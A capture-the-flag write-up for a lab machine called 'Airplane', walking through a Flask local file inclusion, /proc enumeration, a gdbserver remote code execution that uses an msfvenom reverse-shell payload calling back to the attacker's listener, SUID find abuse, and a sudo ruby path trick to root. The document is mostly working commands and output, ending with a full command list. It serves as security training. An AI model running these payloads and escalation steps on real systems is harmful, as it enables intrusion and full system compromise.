# Airplane — CTF Write-Up

## Challenge Overview

This challenge involved a multi-stage privilege escalation path on a Linux machine exposing a Python web application and an internal debugging service. The attack chain included:

- Initial network reconnaissance and service enumeration
- Local file inclusion (LFI) against a Flask app
- File and process discovery via `/proc`
- Hidden service discovery on port `6048`
- Exploitation of a vulnerable `gdbserver` instance
- Abuse of a SUID binary to become `carlos`
- Final sudo-based escalation to root

Target details:

- Host: `airplane.thm` / `10.114.152.216`
- Open services:
  - `22/tcp` — SSH (`OpenSSH 8.2p1 Ubuntu 4ubuntu0.11`)
  - `8000/tcp` — HTTP (`Werkzeug httpd 3.0.2` / Python 3.8.10)
  - `6048/tcp` — hidden gdbserver service

---

## 1. Initial Reconnaissance

I began with a simple service scan:

```bash
nmap -sV 10.114.152.216
```

Observed output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 14:51 -0500
Nmap scan report for airplane.thm (10.114.152.216)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
6048/tcp open  x11?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The presence of port `6048` was initially easy to overlook, but it became critical later. The main web app was on port 8000, so I focused there first.

---

## 2. Web Enumeration and Initial File Inclusion Testing

The web application served a page via the query parameter `page`:

```text
http://airplane.thm:8000/?page=index.html
```

I tested whether the app was vulnerable to path traversal / local file inclusion by attempting to read local system files.

```bash
http://airplane.thm:8000/?page=../../../../etc/passwd
```

This returned a valid user list:

```text
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127,132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

This revealed two relevant users:

- `carlos`
- `hudson`

### Failed attempts and dead ends

I tried a number of obvious but unhelpful LFI options:

```bash
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/auth.log
```

These did not return anything useful. The log files were either unavailable, inaccessible, or not mounted in the expected location.

I also attempted to read the SSH keys directly:

```bash
/home/carlos/.ssh/id_rsa
/home/hudson/.ssh/id_rsa
```

Those attempts failed due to permission restrictions. This confirmed the application did not directly expose the user home directories.

I also checked:

```bash
/proc/self/environ
```

This returned environment data, but it was not useful for exploitation. The key finding was that the LFI primitive was valid and that the app was likely exposing more sensitive system data through other paths.

I also ruled out the usual PHP-based attack paths:

```text
I don't have phpinfo() for session poisoning.
Also, PHP wrappers are disabled because allow_url_include=off, so there is no straightforward way to get RCE via wrappers.
```

This was an important note, because it eliminated the common file-wrapper and session-poisoning routes and forced the investigation toward `/proc` and hidden services instead.

> This was an important reminder that a working LFI primitive does not necessarily mean the obvious files are readable. The trick was to keep enumerating the system and the running process environment.

---

## 3. Fuzzing for Additional Readable Files

Once the file inclusion path was confirmed, I fuzzed the filesystem for useful files using FFUF and a Linux LFI wordlist:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

The output was noisy, so I filtered it down to the meaningful entries:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 14,0,3,1
```

Relevant results:

```text
/etc/passwd             [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 106ms]
/etc/shadow             [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 105ms]
/etc/anacrontab         [Status: 200, Size: 401, Words: 22, Lines: 14, Duration: 118ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 121ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 137ms]
/etc/cups/cupsd.conf    [Status: 200, Size: 6403, Words: 785, Lines: 187, Duration: 113ms]
/etc/issue              [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 144ms]
/etc/hosts              [Status: 200, Size: 224, Words: 20, Lines: 11, Duration: 149ms]
/etc/ssh/ssh_config     [Status: 200, Size: 1603, Words: 245, Lines: 53, Duration: 108ms]
/etc/ssh/sshd_config    [Status: 200, Size: 3289, Words: 294, Lines: 124, Duration: 121ms]
/proc/cpuinfo           [Status: 200, Size: 2332, Words: 289, Lines: 55, Duration: 118ms]
/proc/version           [Status: 200, Size: 154, Words: 17, Lines: 2, Duration: 134ms]
/var/log/dpkg.log       [Status: 200, Size: 3005, Words: 168, Lines: 36, Duration: 268ms]
/var/log/wtmp           [Status: 200, Size: 15744, Words: 10, Lines: 2, Duration: 144ms]
/var/log/dmesg          [Status: 200, Size: 43848, Words: 6686, Lines: 586, Duration: 165ms]
/proc/net/tcp           [Status: 200, Size: 85800, Words: 34605, Lines: 573, Duration: 147ms]
```

This proved the LFI primitive was broad enough to read many system resources. The next step was to read process metadata and the running app source.

---

## 4. Reading the App Source and Runtime Information

I queried the process command line directly:

```bash
http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline
```

Response:

```text
/usr/bin/python3app.py
```

This indicated the app was running from a Python script named `app.py`.

I then read the working directory file:

```bash
http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py
```

The source code was:

```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp

        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

This confirmed the app was a small Flask application serving the `static` directory and using a vulnerable `page` parameter. It also hinted that a later route, `/airplane`, could be relevant, but the actual exploit path was elsewhere.

---

## 5. Discovering the Hidden Service on Port 6048

I focused on the system network metadata next:

```bash
http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp
```

The relevant entries were:

```text
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21719 1 0000000000000000 100 0 0 10 0
4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21080 1 0000000000000000 100 0 0 10 0
```

Converting the hex values:

- `1F40` = `8000`
- `17A0` = `6048`

This was the missing clue: port `6048` was not a random scan artifact; it was a real listening service.

### Identify the PID behind the service

I generated a PID list:

```bash
seq 1 2000 > pid.txt
```

Then I fuzzed the process command lines to match the port `6048` value:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline -w pid.txt -mr "6048"
```

The result:

```text
524                     [Status: 200, Size: 41, Words: 1, Lines: 1, Duration: 142ms]
```

Then I read the process metadata:

```bash
http://airplane.thm:8000/?page=../../../../../../../proc/524/cmdline
```

Output:

```text
/usr/bin/gdbserver0.0.0.0:6048airplane
```

This showed the exact service:

- `/usr/bin/gdbserver`
- listening on `0.0.0.0:6048`

This was the major pivot in the challenge.

---

## 6. Exploiting the gdbserver Service

Once the service was identified, I searched for known exploits:

```bash
searchsploit gdbserver
```

Result:

```text
GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                   | linux/remote/50539.py
```

I copied the exploit to the working directory:

```bash
searchsploit -m linux/remote/50539.py
```

Then I checked its usage:

```bash
python3 50539.py --help
```

Output:

```text
Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```

I generated a payload and launched the exploit against the target port:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.131.124 LPORT=4444 PrependFork=true -o rev.bin
python3 50539.py 10.114.152.216:6048 rev.bin
```

The script reported success:

```text
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

Then I opened a listener:

```bash
nc -nlvp 4444
```

I received a shell from the target, and `id` reported:

```text
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

This was a successful remote code execution pivot.

### Troubleshooting note

The exploit PoC was not always perfectly clean in Python 3, and I had to account for the fact that the gdbserver service was not always behaving exactly the same across environments. However, the payload succeeded, and the challenge objective was met.

---

## 7. Privilege Escalation to `carlos` via SUID `find`

After gaining the `hudson` shell, I looked for SUID binaries that could be abused:

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

Important result:

```text
262477    316 -rwsr-xr-x   1 carlos   carlos     320160 Feb 18  2020 /usr/bin/find
```

This was a classic privilege escalation path. I abused the SUID `find` binary by spawning a shell with elevated privileges:

```bash
find . -exec /bin/sh -p \; -quit
```

Then I verified the privilege change:

```bash
id
```

Output:

```text
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

This meant the shell was now running as `carlos` even though I started as `hudson`.

---

## 8. Enumerating `carlos` Privileges

Once I had the `carlos` context, I checked if the user could execute commands as root:

```bash
sudo -l
```

Observed output:

```text
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This was the final privilege escalation vector.

The relevant path was obvious: `ruby` could be run as root on scripts in `/root` without a password.

---

## 9. Final Root Escalation

I created a malicious Ruby file and executed it via the allowed sudo path:

```bash
echo 'system("/bin/bash")' > /tmp/exploit.rb
sudo /usr/bin/ruby /root/../tmp/exploit.rb
```

This returned a root shell:

```bash
root@airplane:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
```

This worked because the sudoers rule allowed execution of Ruby against scripts under `/root`, and the relative path trick circumvented the expectation of a literal file in `/root`.

---

## 10. Root Flag Retrieval

Once root access was established, I enumerated the root directory:

```bash
ls -la
```

Relevant output:

```text
total 32
drwx------  5 root root 4096 Nis 17  2024 .
drwxr-xr-x 20 root root 4096 Nis 17  2024 ..
lrwxrwxrwx  1 root root    9 Nis 17  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Ara  5  2019 .bashrc
drwx------  3 root root 4096 Nis 17  2024 .cache
drwxr-xr-x  3 root root 4096 Nis 17  2024 .local
-rw-r--r--  1 root root  161 Ara  5  2019 .profile
-rw-r--r--  1 root root   33 Nis 17  2024 root.txt
drwx------  3 root root 4096 Nis 17  2024 snap
```

Then I read the flag:

```bash
cat /root/root.txt
```

This completed the challenge.

---

## 11. Trial-and-Error Log and Dead Ends

This challenge included several false starts and incorrect assumptions that were essential to document because they reflect a realistic exploitation workflow.

### Dead end 1: obvious log poisoning paths

I attempted to read likely log files:

```bash
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/auth.log
```

These did not reveal anything useful because the files were not accessible in the expected form.

### Dead end 2: assumption that user SSH keys would be readable

I tried to read:

```bash
/home/carlos/.ssh/id_rsa
/home/hudson/.ssh/id_rsa
```

These failed due to permissions. This was a realistic false lead because the web process could read some files but not sensitive user home directories.

### Dead end 3: environment variables were not the answer

I checked:

```bash
/proc/self/environ
```

This gave some environment data, but no usable credentials or direct escalation path.

### Dead end 4: the port 6048 clue was easy to miss

The service on port 6048 was not obvious from the original scan because the Nmap output labeled it as `x11?`. I initially missed it, but it later proved to be the key to the chain. This is why keeping the port in the report is important.

### Dead end 5: the PoC was not always smooth

The `gdbserver` exploit script was a public PoC and not perfectly deterministic. Some environment differences caused inconsistent behavior, but the exploit still succeeded and provided the foothold that led to privilege escalation.

### Dead end 6: PHP wrappers and session poisoning were ruled out

I checked for PHP-based attack routes, but they were not viable in this challenge:

```text
I don't have phpinfo() for session poisoning.
Also, PHP wrappers are disabled because allow_url_include=off, so there is no straightforward way to get RCE via wrappers.
```

This was important because it eliminated a common web application exploitation path, preventing time from being wasted on a dead end.

---

## 12. Final Attack Chain Summary

The final exploitation path was:

1. Enumerate services with Nmap
2. Exploit Flask LFI to read `/etc/passwd`
3. Use LFI to read `/proc/self/cmdline` and `/proc/self/cwd/app.py`
4. Read `/proc/net/tcp` and identify `gdbserver` on port `6048`
5. Exploit the gdbserver service for a shell as `hudson`
6. Abuse SUID `find` to escalate to `carlos`
7. Use `sudo -l` to discover the Ruby root execution path
8. Execute a malicious Ruby payload and obtain root
9. Read `/root/root.txt` to complete the challenge

This is a clear example of a multi-stage CTF where arbitrary file read, process enumeration, and binary abuse combine into a successful full compromise.

> Final privilege escalation path: `hudson -> carlos via SUID find` and then `carlos -> root via sudo ruby /root/*.rb`.

---

## 13. Useful Command Summary

```bash
nmap -sV 10.114.152.216
http://airplane.thm:8000/?page=index.html
http://airplane.thm:8000/?page=../../../../etc/passwd
http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline
http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py
http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp
seq 1 2000 > pid.txt
ffuf -u http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline -w pid.txt -mr "6048"
searchsploit gdbserver
searchsploit -m linux/remote/50539.py
python3 50539.py --help
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.131.124 LPORT=4444 PrependFork=true -o rev.bin
python3 50539.py 10.114.152.216:6048 rev.bin
nc -nlvp 4444
find / -perm -4000 -type f -ls 2>/dev/null
find . -exec /bin/sh -p \; -quit
id
sudo -l
echo 'system("/bin/bash")' > /tmp/exploit.rb
sudo /usr/bin/ruby /root/../tmp/exploit.rb
cat /root/root.txt
```

---

![Web application placeholder](https://via.placeholder.com/800x250?text=Airplane+Web+Application)

![Exploit flow placeholder](https://via.placeholder.com/800x250?text=Privilege+Escalation+Flow)
